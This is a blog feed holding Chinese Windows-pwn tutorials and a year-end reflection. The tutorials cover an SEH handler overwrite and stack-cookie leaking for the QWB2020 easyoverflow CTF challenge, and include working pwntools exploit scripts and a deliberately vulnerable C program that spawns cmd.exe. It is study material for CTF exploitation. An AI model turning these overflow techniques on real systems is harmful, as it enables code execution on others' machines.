class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _EXCEPTION_RECORD</span><br><span class="line">test!_EXCEPTION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> ExceptionCode    : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> ExceptionFlags   : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> ExceptionRecord  : Ptr32 _EXCEPTION_RECORD</span><br><span class="line">   +<span class="number">0x00c</span> ExceptionAddress : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> NumberParameters : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> ExceptionInformation : [<span class="number">15</span>] Uint4B</span><br></pre></td></tr></tbody></table></figure><p>重要的就两个<code>ExceptionCode</code>指出异常类型、<code>ExceptionFlags</code>表示发生异常的代码地址，接着看第二个参数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">test!_EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x000</span> Next             : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> Handler          : Ptr32     _EXCEPTION_DISPOSITION</span><br></pre></td></tr></tbody></table></figure><p>该结构体主要用于描述线程异常处理句柄的地址，<code>Next</code>指向下一个结构的指针，<code>Handler</code>当前异常处理回调函数的地址，看一下非常经典的图</p><img src="/2023/02/22/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E5%9B%9B%EF%BC%89/1.png" alt="1" style="zoom:50%;"><p>TIB第一个字段就保存了SEH链表的头部指针，SEH链表中其他的节点存储在栈中，如果Next的成员的值为0xFFFFFFFF则表示在最后一个结点，当发生异常会按照顺序依次传递，直到有异常处理器处理</p><p>接着看一下第三个参数<code>_CONTEXT</code></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _CONTEXT</span><br><span class="line">test!_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> ContextFlags     : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> Dr0              : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> Dr1              : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> Dr2              : Uint4B</span><br><span class="line">   +<span class="number">0x010</span> Dr3              : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> Dr6              : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> Dr7              : Uint4B</span><br><span class="line">   +<span class="number">0x01c</span> FloatSave        : _FLOATING_SAVE_AREA</span><br><span class="line">   +<span class="number">0x08c</span> SegGs            : Uint4B</span><br><span class="line">   +<span class="number">0x090</span> SegFs            : Uint4B</span><br><span class="line">   +<span class="number">0x094</span> SegEs            : Uint4B</span><br><span class="line">   +<span class="number">0x098</span> SegDs            : Uint4B</span><br><span class="line">   +<span class="number">0x09c</span> Edi              : Uint4B</span><br><span class="line">   +<span class="number">0x0a0</span> Esi              : Uint4B</span><br><span class="line">   +<span class="number">0x0a4</span> Ebx              : Uint4B</span><br><span class="line">   +<span class="number">0x0a8</span> Edx              : Uint4B</span><br><span class="line">   +<span class="number">0x0ac</span> Ecx              : Uint4B</span><br><span class="line">   +<span class="number">0x0b0</span> Eax              : Uint4B</span><br><span class="line">   +<span class="number">0x0b4</span> Ebp              : Uint4B</span><br><span class="line">   +<span class="number">0x0b8</span> Eip              : Uint4B</span><br><span class="line">   +<span class="number">0x0bc</span> SegCs            : Uint4B</span><br><span class="line">   +<span class="number">0x0c0</span> EFlags           : Uint4B</span><br><span class="line">   +<span class="number">0x0c4</span> Esp              : Uint4B</span><br><span class="line">   +<span class="number">0x0c8</span> SegSs            : Uint4B</span><br><span class="line">   +<span class="number">0x0cc</span> ExtendedRegisters : [<span class="number">512</span>] UChar</span><br></pre></td></tr></tbody></table></figure><p>这个结构体是用来备份CPU奇存器的值，因为多线程环境下需要这样做。每个线程内部都拥有1个CONTEXT结构体。CPU暂时离开当前线程去运行其他线程时，CPU寄存器的值就会保存到当前线程的CONTEXT结构体；CPU再次运行该线程时，会使用保存在CONTEXT结构体的值来覆盖CPU奇存器的值，然后从之前暂停的代码处继续执行。通过这种方式 ，OS可以在多线程环境下安全运行各线程</p><p>在经典图那里有没有发现发生异常之后有一个TIB，那么TIB又是什么呢</p><blockquote><p><code>TIB</code>(<code>Thread Information Block</code>，线程信息块)是保存线程基本信息的数据结构，它存在于<code>x86</code>的机器上，它也被称为是<code>Win32</code>的<code>TEB</code>(<code>Thread Environment Block</code>，线程环境块)。<code>TIB/TEB</code>是操作系统为了保存每个线程的私有数据创建的，每个线程都有自己的<code>TIB/TEB</code></p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _NT_TIB</span><br><span class="line">test!_NT_TIB</span><br><span class="line">   +<span class="number">0x000</span> ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +<span class="number">0x004</span> StackBase        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x008</span> StackLimit       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> SubSystemTib     : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> FiberData        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x010</span> Version          : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> ArbitraryUserPointer : Ptr32 Void</span><br><span class="line">   +<span class="number">0x018</span> Self             : Ptr32 _NT_TIB</span><br></pre></td></tr></tbody></table></figure><p>第一个就是指向当前线程的SEH，<code>StackBase和StackLimit</code>分别指向当前线程所使用的栈的栈底和栈顶，<code>SubSystemTib</code>是子系统，<code>Self</code>指向自己</p><h2 id="如何通过SEH来控制程序"><a href="#如何通过SEH来控制程序" class="headerlink" title="如何通过SEH来控制程序"></a>如何通过SEH来控制程序</h2><p>现在知识了SEH长什么样子了，但是如何通过SEH来攻击程序呢</p><p>可以通过攻击程序的异常处理，想办法触发一个异常，程序就会转入异常处理，如果异常处理函数指针被我们覆盖，那么我们就可以通过劫持 SEH 来控制程序的后续流程</p><p>也就是去覆盖上面的<code>_except_handler4</code>，如果把<code>_except_handler4</code>给覆盖成<code>backdoor</code>，在异常处理的时候就会去执行<code>backdoor</code>，现在还有一个问题那就是<code>_except_handler4</code>在栈上的哪个地方</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dc <span class="number">0x010ffc64</span> - <span class="number">0x64</span></span><br><span class="line"><span class="number">010f</span>fc00  <span class="number">77b</span>45f8b <span class="number">77</span>cfac49 <span class="number">010f</span>fc10 <span class="number">00000000</span>  ._.wI..w........</span><br><span class="line"><span class="number">010f</span>fc10  <span class="number">00000000</span> <span class="number">010f</span>fc2c <span class="number">51802922</span> <span class="number">1b</span>406328  ....,...<span class="string">").Q(c@.</span></span><br><span class="line"><span class="string">010ffc20  010ffc30 5179bff5 00000000 010ffc3c  0.....yQ....&lt;...</span></span><br><span class="line"><span class="string">010ffc30  010ffc40 517bffc6 00000000 00000000  @.....{Q........</span></span><br><span class="line"><span class="string">010ffc40  010ffc4c 517c02be 518e3074 010ffc60  L.....|Qt0.Q`...</span></span><br><span class="line"><span class="string">010ffc50  517ffbd2 010ffcd0 00141f80 001491c8  ...Q............</span></span><br><span class="line"><span class="string">010ffc60  fffffffe 010ffc84 00142403 00000001  .........$......</span></span><br><span class="line"><span class="string">010ffc70  012c4d88 012c9510 00000001 012c4d88  .M,...,......M,.</span></span><br></pre></td></tr></tbody></table></figure><p>还是上面那个程序<code>0x010ffc64</code>是ebp，<code>0x141F80</code>是<code>_except_handler4</code>，可以看到在<code>ebp - 0xc</code>的地方是<code>_except_handler4</code>，刚好这个程序里有一个栈溢出，所以我们可以控制handler，程序开了GS保护但是没有用，因为先跑去处理异常了</p><p>所以现在写exp来验证一下</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'192.168.10.106'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">backdoor_addr = <span class="built_in">int</span>(r.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">li(<span class="string">'backdoor_addr = '</span> + <span class="built_in">hex</span>(backdoor_addr))</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * (<span class="number">0x64</span> - <span class="number">0xc</span>) + p32(backdoor_addr)</span><br><span class="line">r.sendline(p1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p>弹了一个内存损坏的错误，点重试才可以利用成功，所以思考了一下内存损坏的错误也是在异常里，验证一下，把除0数学错误给去掉</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> {</span><br><span class="line">system(<span class="string">"cmd.exe"</span>);</span><br><span class="line">}  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">{</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line"><span class="type">int</span> x = <span class="number">100</span>;</span><br><span class="line"><span class="type">int</span> y = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> z;</span><br><span class="line"><span class="type">char</span> tmp[<span class="number">0x20</span>];</span><br><span class="line">_try {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%p\n"</span>, backdoor);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>, tmp);</span><br><span class="line">}</span><br><span class="line">_except (<span class="number">1</span>) {</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"seh"</span>);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>最后依旧成功利用，所以以后控制SEH之后可以直接引发一些异常即可</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这里主要学习了SEH，如何去控制SEH来达到劫持程序流的目的，攻击SEH是当年最流行的手法，所以window也发布了对应的加固手法，SAFESEH和SEHOP，后面将会学习SEHOP和SAFESEH的利用</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>逆向工程核心原理</p><p><a href="https://blog.csdn.net/azraelxuemo/article/details/122873073">https://blog.csdn.net/azraelxuemo/article/details/122873073</a></p><p><a href="https://codeantenna.com/a/wBulZH0YEb">https://codeantenna.com/a/wBulZH0YEb</a></p><p><a href="https://a1ex.online/2020/10/15/Windows-Pwn%E5%AD%A6%E4%B9%A0/">https://a1ex.online/2020/10/15/Windows-Pwn%E5%AD%A6%E4%B9%A0/</a></p></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;blockquote&gt;
&lt;p&gt;这篇开始学习SEH&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;之前的文章链接：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://xz.aliyun.com/t/11913&quot;&gt;win pw</summary>
      
    
    
    
    <category term="study" scheme="https://www.z1r0.top/categories/study/"/>
    
    
    <category term="win pwn" scheme="https://www.z1r0.top/tags/win-pwn/"/>
    
  </entry>
  
  <entry>
    <title>2022年终总结</title>
    <link href="https://www.z1r0.top/2022/12/31/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <id>https://www.z1r0.top/2022/12/31/2022%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</id>
    <published>2022-12-31T07:04:43.000Z</published>
    <updated>2023-08-17T06:27:32.432Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="2022年终总结"><a href="#2022年终总结" class="headerlink" title="2022年终总结"></a>2022年终总结</h1><blockquote><p>这是我的第一篇年终总结，这一年把精力都放在了二进制方向的学习上，总得来说收获了很多很多知识，这篇年终总结也是断断续续的写了几天才写完</p></blockquote><h2 id="成长"><a href="#成长" class="headerlink" title="成长"></a>成长</h2><p>二进制安全学习是从21年的暑假开始学习，大一（20年9月-21年6月）的时候搞了一年的开发，但一年过去了发现对开发没有太多兴趣，在大一下的时候那一学期很是迷茫，没有项目做的时候不知道干些什么，对未来也没有太多的规划。偶然间，大一快结束的时候接触到了CTF的PWN，当时就迷上了，在学期结束之后也是和指导老师说了想要搞网安方向，老师也特别的支持</p><p>21年7月就正式开始了二进制方向的学习，当时才学习的时候最简单的栈溢出就难到我了，也不敢在buu群里问（XD，当时感觉自己太菜了不好意思问），过了一个暑假之后PWN基础和栈溢出的一些利用都已经完成，接着就开始堆利用和内核利用学习的旅程，在21年9月的时候建立了自己的blog，也开始记录一些自己学习的东西，并开始参加一些比赛，第一场比赛完全坐牢了，没有一个栈的利用，全是堆的（XD，当时心态都崩了）。所以也就开始了堆利用学习的旅程和内核利用学习的旅程（没有太深入学习），比赛也能不爆0了</p><p>接着就到了22年，我认为是高三到现在对我来说提升最快的一年，也是最有意义的一年。在今年的上半年里，因为CTF PWN和RW的一些差别，我开始接触IOT相关的学习，从最简单的栈溢出到真实的CVE复现，不断的学习，在今年暑假我挖到了人生的第一个CVE，之后在今年的下半年里，陆陆续续的挖出了更多的CVE，并且也拿到了人生的第一个CNVD，在今年下半年，最有意义的是加入星盟安全团队，认识了很多厉害的师傅，从师傅们那里学到了一些没有看见过的知识，学习习惯，解决困难的坚持不懈，也被星盟的师傅们带进了强网拟态防御国际精英挑战赛的总决赛。快到年未的时候，看了很多CVE和别人分享的漏洞文章，发现win上安全占比很高，所以在年未的时候我开始附带着学习win pwn</p><h2 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h2><p>这一年参加了大大小小的比赛，多得都数不清了，从年初的虎符到年未的PWNHUB冬季赛，有很多有用的知识都是在比赛中和比赛后复现。也是进过一些比赛的半决赛和总决赛，和星盟的师傅们打比赛一直都是被带飞，师傅们TQL。自己还是要加油学习。另我印象最深的几场比赛是：虎符（坐牢），国赛（CISCN），蓝帽杯， 强网杯，拟态，祥云杯，PWNHUB，西湖和每场XCTF联赛。很多比赛线下由于疫情的原因转为线上了，现在疫情放开，明年就可以线下和师傅们面基了</p><h2 id="未来"><a href="#未来" class="headerlink" title="未来"></a>未来</h2><p>想当一个二进制安全研究员，也是希望自己可以在IOT安全和WIN安全的道路上走下去。自己也是打算在大三结束也就是2023年暑假去实习（看看哪个地方能要我XD）。考研就放弃了，学不下去考研的东西。二进制学习的话自己是打算明年开始学习fuzz相关的技术，并且打算好好的学习英语，因为读国外文献的时候很吃力。也是希望自己可以在明年挖到人生的第一个win上的CVE。未来路还长，一步一个脚印，加油！</p><h2 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h2><p>自己的专业也只是数字媒体，并不是网安专业的，数字媒体专业课的学习一般，把时间都花在了学习二进制安全上</p><p>希望看到这篇文章的你，可以在明年万事如意，心想事成！加油！你我都有更好的未来！</p></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;2022年终总结&quot;&gt;&lt;a href=&quot;#2022年终总结&quot; class=&quot;headerlink&quot; title=&quot;2022年终总结&quot;&gt;&lt;/a&gt;2022年终总结&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;这是我的第一篇年</summary>
      
    
    
    
    <category term="年终总结" scheme="https://www.z1r0.top/categories/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="年终总结" scheme="https://www.z1r0.top/tags/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>win pwn初探（三）</title>
    <link href="https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/"/>
    <id>https://www.z1r0.top/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/</id>
    <published>2022-12-03T01:45:15.000Z</published>
    <updated>2023-08-17T06:34:14.629Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><blockquote><p>文章首发于<a href="https://xz.aliyun.com/t/11913">先知社区</a></p><p>上两节都是保护机制几乎都没开的情况下，这一节就开始学习绕过ASLR和GS</p></blockquote><h1 id="win-pwn初探（三）"><a href="#win-pwn初探（三）" class="headerlink" title="win pwn初探（三）"></a>win pwn初探（三）</h1><p>这里以强网杯2020的<a href="https://github.com/z1r00/ctf-pwn/blob/main/winpwn/QWB2020/easyoverflow.zip">easyoverflow</a>来练习学习</p><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><img src="/2022/12/03/win-pwn%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%89%EF%BC%89/1.png" alt="1" style="zoom:50%;"><p>没有开SafeSEH和CFG，其他重要的保护都开了</p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  FILE *v3; <span class="comment">// rax</span></span><br><span class="line">  FILE *v4; <span class="comment">// rax</span></span><br><span class="line">  FILE *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> DstBuf[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = _acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  setbuf(v3, <span class="number">0</span>i64);</span><br><span class="line">  v4 = _acrt_iob_func(<span class="number">1u</span>);</span><br><span class="line">  setbuf(v4, <span class="number">0</span>i64);</span><br><span class="line">  v5 = _acrt_iob_func(<span class="number">2u</span>);</span><br><span class="line">  setbuf(v5, <span class="number">0</span>i64);</span><br><span class="line">  v6 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  {</span><br><span class="line">    --v6;</span><br><span class="line">    <span class="built_in">memset</span>(DstBuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(DstBuf));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"input:"</span>);</span><br><span class="line">    read(<span class="number">0</span>, DstBuf, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"buffer:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(DstBuf);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">while</span> ( v6 &gt; <span class="number">0</span> );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这个程序很简单，read这里的DstBuf，可以输入0x400大小的数据，而DestBuf是256的空间，所以存在一个栈溢出漏洞</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="泄露StackCookie"><a href="#泄露StackCookie" class="headerlink" title="泄露StackCookie"></a>泄露StackCookie</h3><p>在CTF的PWN中，因为有canary的存在，所以先泄露出canary，再泄露出程序基地址，最后利用ret2libc3即可攻击成功</p><p>在win中的利用也很相似，首先需要泄露出<code>StackCookie</code>这个东西，看一下汇编，这个东西是怎么放入程序的一些地址中的</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push    rbx</span><br><span class="line">sub     rsp, 130h</span><br><span class="line">mov     rax, cs:__security_cookie</span><br><span class="line">xor     rax, rsp</span><br><span class="line">mov     [rsp+138h+var_18], rax</span><br></pre></td></tr></tbody></table></figure><p>在程序开头会将<code>__security_cookie</code>放入rax，然后与rsp进行异或，之后把异或的结果（<code>StackCookie</code>）存放在<code>rsp + 138h + var_18</code>中，再看一下程序的最后</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xor     eax, eax</span><br><span class="line">mov     rcx, [rsp+138h+var_18]</span><br><span class="line">xor     rcx, rsp        ; StackCookie</span><br><span class="line">call    __security_check_cookie</span><br><span class="line">add     rsp, 130h</span><br><span class="line">pop     rbx</span><br><span class="line">retn</span><br></pre></td></tr></tbody></table></figure><p>程序结束前会把<code>rsp + 138h + var_18</code>里面的值给到rcx，也就是把上面<code>StackCookie</code>与rsp异或之后的值给rcx，然后再经过一次异或（这样的话<code>StackCookie</code>的值就会回到<code>__security_cookie</code>），最后与<code>__security_cookie</code>进行比较，如果相等则继续，不相等则crash掉</p><p>先构造以下poc测试一下</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">'\x1b[01;38;5;1m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'10.211.55.3'</span>, <span class="number">1234</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b'a'</span> * <span class="number">8</span></span><br><span class="line">r.sendlineafter(<span class="string">'input:'</span>, p1)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure><p>然后在<code>puts("buffer:");</code>这里下个断点，之后看一下rsp的布局</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dq rsp</span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>840  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>850  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000002</span></span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>860  <span class="number">61616161</span>`<span class="number">61616161</span> <span class="number">00000000</span>`<span class="number">0000000</span>a</span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>870  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>880  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>890  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>8a0  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></tbody></table></figure><p>可以看到8个a已经被写入，上面的<code>StackCookie</code>会存到<code>rsp + 0x138 - 0x18</code>中，所以看一下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dq rsp + <span class="number">0x138</span> - <span class="number">0x18</span></span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>960  <span class="number">00005f</span>b0`<span class="number">2</span>d14eecc <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>970  <span class="number">000002e8</span>`<span class="number">94297480</span> <span class="number">00007f</span>f6`<span class="number">71</span>ad12f4</span><br><span class="line"><span class="number">000000</span>ee`<span class="number">9973f</span>980  <span class="number">000000</span>ee`<span class="number">9973f</span>9e0 <span class="number">00007f</span>f6`<span class="number">71</span>ad136d</span><br></pre></td></tr></tbody></table></figure><p>此时程序的StackCookie是<code>00005fb0 2d14eecc</code>这个值也就是<code>0x5fb02d14eecc</code>，看一下输入的buf距离这个地址多少，<code>ee9973f960 - ee9973f860 = 